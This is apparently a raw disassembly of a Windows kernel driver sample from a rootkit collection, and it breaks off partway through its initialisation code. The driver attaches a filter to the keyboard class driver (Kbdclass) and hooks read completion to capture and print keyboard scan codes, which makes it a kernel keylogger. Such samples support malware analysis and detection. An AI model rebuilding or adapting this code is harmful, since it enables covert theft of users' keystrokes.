
malware_samples/rootkit/6839aba6f0f89a1bb9ca3ec7219d85a07bfdac7d270f3edee8e67904605c60ef.sys:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	4c 8b dc             	mov    %rsp,%r11
   140001003:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140001007:	49 89 73 10          	mov    %rsi,0x10(%r11)
   14000100b:	55                   	push   %rbp
   14000100c:	57                   	push   %rdi
   14000100d:	41 56                	push   %r14
   14000100f:	48 8b ec             	mov    %rsp,%rbp
   140001012:	48 83 ec 50          	sub    $0x50,%rsp
   140001016:	4c 8b f1             	mov    %rcx,%r14
   140001019:	c7 45 f0 20 00 22 00 	movl   $0x220020,-0x10(%rbp)
   140001020:	48 8d 05 d9 05 00 00 	lea    0x5d9(%rip),%rax        # 0x140001600
   140001027:	45 33 c9             	xor    %r9d,%r9d
   14000102a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000102e:	45 33 c0             	xor    %r8d,%r8d
   140001031:	48 8d 45 38          	lea    0x38(%rbp),%rax
   140001035:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001039:	49 83 63 c8 00       	andq   $0x0,-0x38(%r11)
   14000103e:	41 8d 51 40          	lea    0x40(%r9),%edx
   140001042:	48 8b 05 2f 10 00 00 	mov    0x102f(%rip),%rax        # 0x140002078
   140001049:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   14000104e:	48 8b 08             	mov    (%rax),%rcx
   140001051:	49 89 4b b8          	mov    %rcx,-0x48(%r11)
   140001055:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001059:	e8 61 04 00 00       	call   0x1400014bf
   14000105e:	8b d8                	mov    %eax,%ebx
   140001060:	85 c0                	test   %eax,%eax
   140001062:	0f 88 bb 00 00 00    	js     0x140001123
   140001068:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000106c:	ff 15 f6 0f 00 00    	call   *0xff6(%rip)        # 0x140002068
   140001072:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140001076:	48 8b 78 08          	mov    0x8(%rax),%rdi
   14000107a:	e9 8d 00 00 00       	jmp    0x14000110c
   14000107f:	44 8b 4f 48          	mov    0x48(%rdi),%r9d
   140001083:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140001087:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000108c:	45 33 c0             	xor    %r8d,%r8d
   14000108f:	8b 47 34             	mov    0x34(%rdi),%eax
   140001092:	49 8b ce             	mov    %r14,%rcx
   140001095:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   14000109a:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000109e:	41 8d 50 48          	lea    0x48(%r8),%edx
   1400010a2:	ff 15 98 0f 00 00    	call   *0xf98(%rip)        # 0x140002040
   1400010a8:	8b d8                	mov    %eax,%ebx
   1400010aa:	85 c0                	test   %eax,%eax
   1400010ac:	78 75                	js     0x140001123
   1400010ae:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400010b2:	48 8b d7             	mov    %rdi,%rdx
   1400010b5:	ff 15 6d 0f 00 00    	call   *0xf6d(%rip)        # 0x140002028
   1400010bb:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400010bf:	48 8b f0             	mov    %rax,%rsi
   1400010c2:	48 85 c0             	test   %rax,%rax
   1400010c5:	74 6f                	je     0x140001136
   1400010c7:	48 8b d1             	mov    %rcx,%rdx
   1400010ca:	4c 8b c8             	mov    %rax,%r9
   1400010cd:	48 8b 49 40          	mov    0x40(%rcx),%rcx
   1400010d1:	4c 8b c7             	mov    %rdi,%r8
   1400010d4:	e8 a3 00 00 00       	call   0x14000117c
   1400010d9:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400010dd:	8b 56 48             	mov    0x48(%rsi),%edx
   1400010e0:	89 51 48             	mov    %edx,0x48(%rcx)
   1400010e3:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400010e7:	8b 56 34             	mov    0x34(%rsi),%edx
   1400010ea:	89 51 34             	mov    %edx,0x34(%rcx)
   1400010ed:	8a 4e 4c             	mov    0x4c(%rsi),%cl
   1400010f0:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400010f4:	fe c1                	inc    %cl
   1400010f6:	88 48 4c             	mov    %cl,0x4c(%rax)
   1400010f9:	8b 46 30             	mov    0x30(%rsi),%eax
   1400010fc:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140001100:	25 14 20 00 00       	and    $0x2014,%eax
   140001105:	09 41 30             	or     %eax,0x30(%rcx)
   140001108:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   14000110c:	48 85 ff             	test   %rdi,%rdi
   14000110f:	0f 85 6a ff ff ff    	jne    0x14000107f
   140001115:	48 8d 0d 14 05 00 00 	lea    0x514(%rip),%rcx        # 0x140001630
   14000111c:	e8 98 03 00 00       	call   0x1400014b9
   140001121:	8b c3                	mov    %ebx,%eax
   140001123:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140001128:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000112d:	48 83 c4 50          	add    $0x50,%rsp
   140001131:	41 5e                	pop    %r14
   140001133:	5f                   	pop    %rdi
   140001134:	5d                   	pop    %rbp
   140001135:	c3                   	ret
   140001136:	ff 15 0c 0f 00 00    	call   *0xf0c(%rip)        # 0x140002048
   14000113c:	eb e3                	jmp    0x140001121
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001145:	57                   	push   %rdi
   140001146:	48 83 ec 20          	sub    $0x20,%rsp
   14000114a:	48 8b 79 40          	mov    0x40(%rcx),%rdi
   14000114e:	48 8b d9             	mov    %rcx,%rbx
   140001151:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   140001155:	ff 15 f5 0e 00 00    	call   *0xef5(%rip)        # 0x140002050
   14000115b:	48 83 67 10 00       	andq   $0x0,0x10(%rdi)
   140001160:	48 8b cb             	mov    %rbx,%rcx
   140001163:	ff 15 df 0e 00 00    	call   *0xedf(%rip)        # 0x140002048
   140001169:	48 83 67 08 00       	andq   $0x0,0x8(%rdi)
   14000116e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001173:	33 c0                	xor    %eax,%eax
   140001175:	48 83 c4 20          	add    $0x20,%rsp
   140001179:	5f                   	pop    %rdi
   14000117a:	c3                   	ret
   14000117b:	cc                   	int3
   14000117c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001181:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001186:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000118b:	41 56                	push   %r14
   14000118d:	48 83 ec 20          	sub    $0x20,%rsp
   140001191:	48 8b da             	mov    %rdx,%rbx
   140001194:	49 8b f8             	mov    %r8,%rdi
   140001197:	33 d2                	xor    %edx,%edx
   140001199:	49 8b f1             	mov    %r9,%rsi
   14000119c:	4c 8b f1             	mov    %rcx,%r14
   14000119f:	44 8d 42 48          	lea    0x48(%rdx),%r8d
   1400011a3:	e8 58 03 00 00       	call   0x140001500
   1400011a8:	49 83 66 20 00       	andq   $0x0,0x20(%r14)
   1400011ad:	49 8d 4e 28          	lea    0x28(%r14),%rcx
   1400011b1:	45 33 c0             	xor    %r8d,%r8d
   1400011b4:	49 89 5e 08          	mov    %rbx,0x8(%r14)
   1400011b8:	33 d2                	xor    %edx,%edx
   1400011ba:	49 89 7e 10          	mov    %rdi,0x10(%r14)
   1400011be:	49 89 76 18          	mov    %rsi,0x18(%r14)
   1400011c2:	41 c7 06 48 00 00 00 	movl   $0x48,(%r14)
   1400011c9:	ff 15 41 0e 00 00    	call   *0xe41(%rip)        # 0x140002010
   1400011cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400011d4:	33 c0                	xor    %eax,%eax
   1400011d6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400011db:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400011e0:	48 83 c4 20          	add    $0x20,%rsp
   1400011e4:	41 5e                	pop    %r14
   1400011e6:	c3                   	ret
   1400011e7:	cc                   	int3
   1400011e8:	cc                   	int3
   1400011e9:	cc                   	int3
   1400011ea:	cc                   	int3
   1400011eb:	cc                   	int3
   1400011ec:	cc                   	int3
   1400011ed:	cc                   	int3
   1400011ee:	cc                   	int3
   1400011ef:	cc                   	int3
   1400011f0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400011f5:	57                   	push   %rdi
   1400011f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011fa:	48 8b f9             	mov    %rcx,%rdi
   1400011fd:	48 c7 44 24 30 c0 bd 	movq   $0xfffffffffff0bdc0,0x30(%rsp)
   140001204:	f0 ff 
   140001206:	65 48 8b 0c 25 88 01 	mov    %gs:0x188,%rcx
   14000120d:	00 00 
   14000120f:	ba 10 00 00 00       	mov    $0x10,%edx
   140001214:	ff 15 06 0e 00 00    	call   *0xe06(%rip)        # 0x140002020
   14000121a:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000121e:	eb 0c                	jmp    0x14000122c
   140001220:	48 8b cb             	mov    %rbx,%rcx
   140001223:	e8 18 ff ff ff       	call   0x140001140
   140001228:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   14000122c:	48 85 db             	test   %rbx,%rbx
   14000122f:	75 ef                	jne    0x140001220
   140001231:	48 21 5f 08          	and    %rbx,0x8(%rdi)
   140001235:	eb 0f                	jmp    0x140001246
   140001237:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000123c:	33 d2                	xor    %edx,%edx
   14000123e:	33 c9                	xor    %ecx,%ecx
   140001240:	ff 15 d2 0d 00 00    	call   *0xdd2(%rip)        # 0x140002018
   140001246:	83 3d c3 1d 00 00 00 	cmpl   $0x0,0x1dc3(%rip)        # 0x140003010
   14000124d:	75 e8                	jne    0x140001237
   14000124f:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001254:	48 83 c4 20          	add    $0x20,%rsp
   140001258:	5f                   	pop    %rdi
   140001259:	c3                   	ret
   14000125a:	cc                   	int3
   14000125b:	cc                   	int3
   14000125c:	cc                   	int3
   14000125d:	cc                   	int3
   14000125e:	cc                   	int3
   14000125f:	cc                   	int3
   140001260:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140001264:	48 8b 48 18          	mov    0x18(%rax),%rcx
   140001268:	fe 42 43             	incb   0x43(%rdx)
   14000126b:	48 83 82 b8 00 00 00 	addq   $0x48,0xb8(%rdx)
   140001272:	48 
   140001273:	48 ff 25 b6 0d 00 00 	rex.W jmp *0xdb6(%rip)        # 0x140002030
   14000127a:	cc                   	int3
   14000127b:	cc                   	int3
   14000127c:	cc                   	int3
   14000127d:	cc                   	int3
   14000127e:	cc                   	int3
   14000127f:	cc                   	int3
   140001280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001285:	57                   	push   %rdi
   140001286:	48 83 ec 20          	sub    $0x20,%rsp
   14000128a:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   140001291:	48 8b d9             	mov    %rcx,%rbx
   140001294:	48 8b 79 40          	mov    0x40(%rcx),%rdi
   140001298:	44 8a 40 01          	mov    0x1(%rax),%r8b
   14000129c:	48 83 c0 48          	add    $0x48,%rax
   1400012a0:	fe 42 43             	incb   0x43(%rdx)
   1400012a3:	48 89 82 b8 00 00 00 	mov    %rax,0xb8(%rdx)
   1400012aa:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400012ae:	41 80 f8 02          	cmp    $0x2,%r8b
   1400012b2:	74 08                	je     0x1400012bc
   1400012b4:	ff 15 76 0d 00 00    	call   *0xd76(%rip)        # 0x140002030
   1400012ba:	eb 1b                	jmp    0x1400012d7
   1400012bc:	ff 15 6e 0d 00 00    	call   *0xd6e(%rip)        # 0x140002030
   1400012c2:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400012c6:	ff 15 84 0d 00 00    	call   *0xd84(%rip)        # 0x140002050
   1400012cc:	48 8b cb             	mov    %rbx,%rcx
   1400012cf:	ff 15 73 0d 00 00    	call   *0xd73(%rip)        # 0x140002048
   1400012d5:	33 c0                	xor    %eax,%eax
   1400012d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400012dc:	48 83 c4 20          	add    $0x20,%rsp
   1400012e0:	5f                   	pop    %rdi
   1400012e1:	c3                   	ret
   1400012e2:	cc                   	int3
   1400012e3:	cc                   	int3
   1400012e4:	cc                   	int3
   1400012e5:	cc                   	int3
   1400012e6:	cc                   	int3
   1400012e7:	cc                   	int3
   1400012e8:	cc                   	int3
   1400012e9:	cc                   	int3
   1400012ea:	cc                   	int3
   1400012eb:	cc                   	int3
   1400012ec:	cc                   	int3
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400012f5:	57                   	push   %rdi
   1400012f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400012fa:	48 8b 59 40          	mov    0x40(%rcx),%rbx
   1400012fe:	48 8b fa             	mov    %rdx,%rdi
   140001301:	48 8b ca             	mov    %rdx,%rcx
   140001304:	ff 15 56 0d 00 00    	call   *0xd56(%rip)        # 0x140002060
   14000130a:	fe 47 43             	incb   0x43(%rdi)
   14000130d:	48 8b d7             	mov    %rdi,%rdx
   140001310:	48 83 87 b8 00 00 00 	addq   $0x48,0xb8(%rdi)
   140001317:	48 
   140001318:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000131c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001321:	48 83 c4 20          	add    $0x20,%rsp
   140001325:	5f                   	pop    %rdi
   140001326:	48 ff 25 2b 0d 00 00 	rex.W jmp *0xd2b(%rip)        # 0x140002058
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001335:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000133a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000133f:	57                   	push   %rdi
   140001340:	48 83 ec 20          	sub    $0x20,%rsp
   140001344:	33 ed                	xor    %ebp,%ebp
   140001346:	48 8b da             	mov    %rdx,%rbx
   140001349:	39 6a 30             	cmp    %ebp,0x30(%rdx)
   14000134c:	7c 34                	jl     0x140001382
   14000134e:	48 8b 42 38          	mov    0x38(%rdx),%rax
   140001352:	48 8b 72 18          	mov    0x18(%rdx),%rsi
   140001356:	48 c1 e8 03          	shr    $0x3,%rax
   14000135a:	85 c0                	test   %eax,%eax
   14000135c:	74 24                	je     0x140001382
   14000135e:	8b f8                	mov    %eax,%edi
   140001360:	66 39 6e 04          	cmp    %bp,0x4(%rsi)
   140001364:	74 16                	je     0x14000137c
   140001366:	44 0f b7 4e 02       	movzwl 0x2(%rsi),%r9d
   14000136b:	4c 8d 05 7e 02 00 00 	lea    0x27e(%rip),%r8        # 0x1400015f0
   140001372:	33 d2                	xor    %edx,%edx
   140001374:	33 c9                	xor    %ecx,%ecx
   140001376:	ff 15 8c 0c 00 00    	call   *0xc8c(%rip)        # 0x140002008
   14000137c:	48 83 ef 01          	sub    $0x1,%rdi
   140001380:	75 de                	jne    0x140001360
   140001382:	ff 0d 88 1c 00 00    	decl   0x1c88(%rip)        # 0x140003010
   140001388:	40 38 6b 41          	cmp    %bpl,0x41(%rbx)
   14000138c:	74 0b                	je     0x140001399
   14000138e:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   140001395:	80 48 03 01          	orb    $0x1,0x3(%rax)
   140001399:	8b 43 30             	mov    0x30(%rbx),%eax
   14000139c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400013a1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400013a6:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400013ab:	48 83 c4 20          	add    $0x20,%rsp
   1400013af:	5f                   	pop    %rdi
   1400013b0:	c3                   	ret
   1400013b1:	cc                   	int3
   1400013b2:	cc                   	int3
   1400013b3:	cc                   	int3
   1400013b4:	cc                   	int3
   1400013b5:	cc                   	int3
   1400013b6:	cc                   	int3
   1400013b7:	cc                   	int3
   1400013b8:	cc                   	int3
   1400013b9:	cc                   	int3
   1400013ba:	cc                   	int3
   1400013bb:	cc                   	int3
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013c4:	4c 8b c2             	mov    %rdx,%r8
   1400013c7:	48 8b d1             	mov    %rcx,%rdx
   1400013ca:	41 80 78 43 01       	cmpb   $0x1,0x43(%r8)
   1400013cf:	75 22                	jne    0x1400013f3
   1400013d1:	49 83 60 38 00       	andq   $0x0,0x38(%r8)
   1400013d6:	33 d2                	xor    %edx,%edx
   1400013d8:	49 8b c8             	mov    %r8,%rcx
   1400013db:	41 c7 40 30 10 00 00 	movl   $0xc0000010,0x30(%r8)
   1400013e2:	c0 
   1400013e3:	ff 15 4f 0c 00 00    	call   *0xc4f(%rip)        # 0x140002038
   1400013e9:	b8 10 00 00 c0       	mov    $0xc0000010,%eax
   1400013ee:	48 83 c4 28          	add    $0x28,%rsp
   1400013f2:	c3                   	ret
   1400013f3:	ff 05 17 1c 00 00    	incl   0x1c17(%rip)        # 0x140003010
   1400013f9:	4c 8d 0d 30 ff ff ff 	lea    -0xd0(%rip),%r9        # 0x140001330
   140001400:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140001404:	48 8b 48 18          	mov    0x18(%rax),%rcx
   140001408:	49 8b 80 b8 00 00 00 	mov    0xb8(%r8),%rax
   14000140f:	0f 10 00             	movups (%rax),%xmm0
   140001412:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   140001416:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000141a:	0f 11 48 c8          	movups %xmm1,-0x38(%rax)
   14000141e:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140001422:	0f 11 40 d8          	movups %xmm0,-0x28(%rax)
   140001426:	f2 0f 10 48 30       	movsd  0x30(%rax),%xmm1
   14000142b:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   140001430:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   140001434:	49 8b 80 b8 00 00 00 	mov    0xb8(%r8),%rax
   14000143b:	48 89 50 f8          	mov    %rdx,-0x8(%rax)
   14000143f:	49 8b d0             	mov    %r8,%rdx
   140001442:	4c 89 48 f0          	mov    %r9,-0x10(%rax)
   140001446:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   14000144a:	48 83 c4 28          	add    $0x28,%rsp
   14000144e:	48 ff 25 db 0b 00 00 	rex.W jmp *0xbdb(%rip)        # 0x140002030
   140001455:	cc                   	int3
   140001456:	cc                   	int3
   140001457:	cc                   	int3
   140001458:	40 57                	rex push %rdi
   14000145a:	48 83 ec 20          	sub    $0x20,%rsp
   14000145e:	4c 8b c1             	mov    %rcx,%r8
   140001461:	48 8d 79 70          	lea    0x70(%rcx),%rdi
   140001465:	48 8d 05 84 fd ff ff 	lea    -0x27c(%rip),%rax        # 0x1400011f0
   14000146c:	48 89 41 68          	mov    %rax,0x68(%rcx)
   140001470:	48 8d 05 e9 fd ff ff 	lea    -0x217(%rip),%rax        # 0x140001260
   140001477:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   14000147c:	f3 48 ab             	rep stos %rax,(%rdi)
   14000147f:	48 8d 05 3a ff ff ff 	lea    -0xc6(%rip),%rax        # 0x1400013c0
   140001486:	49 8b c8             	mov    %r8,%rcx
   140001489:	49 89 80 88 00 00 00 	mov    %rax,0x88(%r8)
   140001490:	48 8d 05 59 fe ff ff 	lea    -0x1a7(%rip),%rax        # 0x1400012f0
   140001497:	49 89 80 20 01 00 00 	mov    %rax,0x120(%r8)
   14000149e:	48 8d 05 db fd ff ff 	lea    -0x225(%rip),%rax        # 0x140001280
   1400014a5:	49 89 80 48 01 00 00 	mov    %rax,0x148(%r8)
   1400014ac:	e8 4f fb ff ff       	call   0x140001000
   1400014b1:	33 c0                	xor    %eax,%eax
   1400014b3:	48 83 c4 20          	add    $0x20,%rsp
   1400014b7:	5f                   	pop    %rdi
   1400014b8:	c3                   	ret
   1400014b9:	ff 25 41 0b 00 00    	jmp    *0xb41(%rip)        # 0x140002000
   1400014bf:	ff 25 ab 0b 00 00    	jmp    *0xbab(%rip)        # 0x140002070
   1400014c5:	cc                   	int3
   1400014c6:	cc                   	int3
   1400014c7:	cc                   	int3
   1400014c8:	cc                   	int3
   1400014c9:	cc                   	int3
   1400014ca:	cc                   	int3
   1400014cb:	cc                   	int3
   1400014cc:	cc                   	int3
   1400014cd:	cc                   	int3
   1400014ce:	cc                   	int3
   1400014cf:	cc                   	int3
   1400014d0:	c2 00 00             	ret    $0x0
   1400014d3:	cc                   	int3
   1400014d4:	cc                   	int3
   1400014d5:	cc                   	int3
   1400014d6:	cc                   	int3
   1400014d7:	cc                   	int3
   1400014d8:	cc                   	int3
   1400014d9:	cc                   	int3
   1400014da:	cc                   	int3
   1400014db:	cc                   	int3
   1400014dc:	cc                   	int3
   1400014dd:	cc                   	int3
   1400014de:	cc                   	int3
   1400014df:	cc                   	int3
   1400014e0:	cc                   	int3
   1400014e1:	cc                   	int3
   1400014e2:	cc                   	int3
   1400014e3:	cc                   	int3
   1400014e4:	cc                   	int3
   1400014e5:	cc                   	int3
   1400014e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400014ed:	00 00 00 
   1400014f0:	ff e0                	jmp    *%rax
   1400014f2:	cc                   	int3
   1400014f3:	cc                   	int3
   1400014f4:	cc                   	int3
   1400014f5:	cc                   	int3
   1400014f6:	cc                   	int3
   1400014f7:	cc                   	int3
   1400014f8:	cc                   	int3
   1400014f9:	cc                   	int3
   1400014fa:	cc                   	int3
   1400014fb:	cc                   	int3
   1400014fc:	cc                   	int3
   1400014fd:	cc                   	int3
   1400014fe:	cc                   	int3
   1400014ff:	cc                   	int3
   140001500:	48 8b c1             	mov    %rcx,%rax
   140001503:	49 83 f8 08          	cmp    $0x8,%r8
   140001507:	72 47                	jb     0x140001550
   140001509:	0f b6 d2             	movzbl %dl,%edx
   14000150c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140001513:	01 01 01 
   140001516:	49 0f af d1          	imul   %r9,%rdx
   14000151a:	49 83 f8 4f          	cmp    $0x4f,%r8
   14000151e:	73 50                	jae    0x140001570
   140001520:	4d 8b c8             	mov    %r8,%r9
   140001523:	49 83 e1 f8          	and    $0xfffffffffffffff8,%r9
   140001527:	49 03 c9             	add    %r9,%rcx
   14000152a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001530:	4a 89 54 08 f8       	mov    %rdx,-0x8(%rax,%r9,1)
   140001535:	49 83 e9 08          	sub    $0x8,%r9
   140001539:	75 f5                	jne    0x140001530
   14000153b:	49 83 e0 07          	and    $0x7,%r8
   14000153f:	74 05                	je     0x140001546
   140001541:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   140001546:	c3                   	ret
   140001547:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000154e:	00 00 
   140001550:	49 83 e0 07          	and    $0x7,%r8
   140001554:	74 0a                	je     0x140001560
   140001556:	42 88 54 00 ff       	mov    %dl,-0x1(%rax,%r8,1)
   14000155b:	49 ff c8             	dec    %r8
   14000155e:	75 f6                	jne    0x140001556
   140001560:	c3                   	ret
   140001561:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140001568:	0f 1f 84 00 00 00 00 
   14000156f:	00 
   140001570:	66 48 0f 6e c2       	movq   %rdx,%xmm0
   140001575:	0f 16 c0             	movlhps %xmm0,%xmm0
   140001578:	0f 11 01             	movups %xmm0,(%rcx)
   14000157b:	4c 03 c1             	add    %rcx,%r8
   14000157e:	48 83 c1 10          	add    $0x10,%rcx
   140001582:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140001586:	4c 2b c1             	sub    %rcx,%r8
   140001589:	4d 8b c8             	mov    %r8,%r9
   14000158c:	49 c1 e9 07          	shr    $0x7,%r9
   140001590:	74 2f                	je     0x1400015c1
   140001592:	0f 29 01             	movaps %xmm0,(%rcx)
   140001595:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140001599:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400015a0:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   1400015a4:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   1400015a8:	49 ff c9             	dec    %r9
   1400015ab:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   1400015af:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   1400015b3:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   1400015b7:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1400015bb:	75 d5                	jne    0x140001592
   1400015bd:	49 83 e0 7f          	and    $0x7f,%r8
   1400015c1:	4d 8b c8             	mov    %r8,%r9
   1400015c4:	49 c1 e9 04          	shr    $0x4,%r9
   1400015c8:	74 12                	je     0x1400015dc
   1400015ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400015d0:	0f 11 01             	movups %xmm0,(%rcx)
   1400015d3:	48 83 c1 10          	add    $0x10,%rcx
   1400015d7:	49 ff c9             	dec    %r9
   1400015da:	75 f4                	jne    0x1400015d0
   1400015dc:	49 83 e0 0f          	and    $0xf,%r8
   1400015e0:	74 06                	je     0x1400015e8
   1400015e2:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   1400015e8:	c3                   	ret
   1400015e9:	cc                   	int3
   1400015ea:	cc                   	int3
   1400015eb:	cc                   	int3
   1400015ec:	cc                   	int3
   1400015ed:	cc                   	int3
   1400015ee:	cc                   	int3
   1400015ef:	cc                   	int3
   1400015f0:	bc fc b4 fa c2       	mov    $0xc2fab4fc,%esp
   1400015f5:	eb 3a                	jmp    0x140001631
   1400015f7:	25 58 00 cc cc       	and    $0xcccc0058,%eax
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	5c                   	pop    %rsp
   140001601:	00 44 00 72          	add    %al,0x72(%rax,%rax,1)
   140001605:	00 69 00             	add    %ch,0x0(%rcx)
   140001608:	76 00                	jbe    0x14000160a
   14000160a:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000160e:	5c                   	pop    %rsp
   14000160f:	00 4b 00             	add    %cl,0x0(%rbx)
   140001612:	62                   	(bad)
   140001613:	00 64 00 63          	add    %ah,0x63(%rax,%rax,1)
   140001617:	00 6c 00 61          	add    %ch,0x61(%rax,%rax,1)
   14000161b:	00 73 00             	add    %dh,0x0(%rbx)
   14000161e:	73 00                	jae    0x140001620
   140001620:	00 00                	add    %al,(%rax)
   140001622:	cc                   	int3
   140001623:	cc                   	int3
   140001624:	cc                   	int3
   140001625:	cc                   	int3
   140001626:	cc                   	int3
   140001627:	cc                   	int3
   140001628:	cc                   	int3
   140001629:	cc                   	int3
   14000162a:	cc                   	int3
   14000162b:	cc                   	int3
   14000162c:	cc                   	int3
   14000162d:	cc                   	int3
   14000162e:	cc                   	int3
   14000162f:	cc                   	int3
   140001630:	43 72 65             	rex.XB jb 0x140001698
   140001633:	61                   	(bad)
   140001634:	74 65                	je     0x14000169b
   140001636:	20 41 6e             	and    %al,0x6e(%rcx)
   140001639:	64 20 41 74          	and    %al,%fs:0x74(%rcx)
   14000163d:	74 61                	je     0x1400016a0
   14000163f:	63 68 20             	movsxd 0x20(%rax),%ebp
   140001642:	46 69 6e 73 68 65 64 	rex.RX imul $0x2e646568,0x73(%rsi),%r13d
   140001649:	2e 
   14000164a:	2e 2e 0a 00          	cs cs or (%rax),%al

Disassembly of section INIT:

0000000140005000 <INIT>:
   140005000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005005:	57                   	push   %rdi
   140005006:	48 83 ec 20          	sub    $0x20,%rsp
   14000500a:	48 8b da             	mov    %rdx,%rbx
   14000500d:	48 8b f9             	mov    %rcx,%rdi
   140005010:	e8 17 00 00 00       	call   0x14000502c
   140005015:	48 8b d3             	mov    %rbx,%rdx
   140005018:	48 8b cf             	mov    %rdi,%rcx
   14000501b:	e8 38 c4 ff ff       	call   0x140001458
   140005020:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005025:	48 83 c4 20          	add    $0x20,%rsp
   140005029:	5f                   	pop    %rdi
   14000502a:	c3                   	ret
   14000502b:	cc                   	int3
   14000502c:	48 8b 05 cd df ff ff 	mov    -0x2033(%rip),%rax        # 0x140003000
   140005033:	45 33 c9             	xor    %r9d,%r9d
   140005036:	49 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%r8
   14000503d:	2b 00 00 
   140005040:	48 85 c0             	test   %rax,%rax
   140005043:	74 05                	je     0x14000504a
   140005045:	49 3b c0             	cmp    %r8,%rax
   140005048:	75 38                	jne    0x140005082
   14000504a:	0f 31                	rdtsc
   14000504c:	48 c1 e2 20          	shl    $0x20,%rdx
   140005050:	48 8d 0d a9 df ff ff 	lea    -0x2057(%rip),%rcx        # 0x140003000
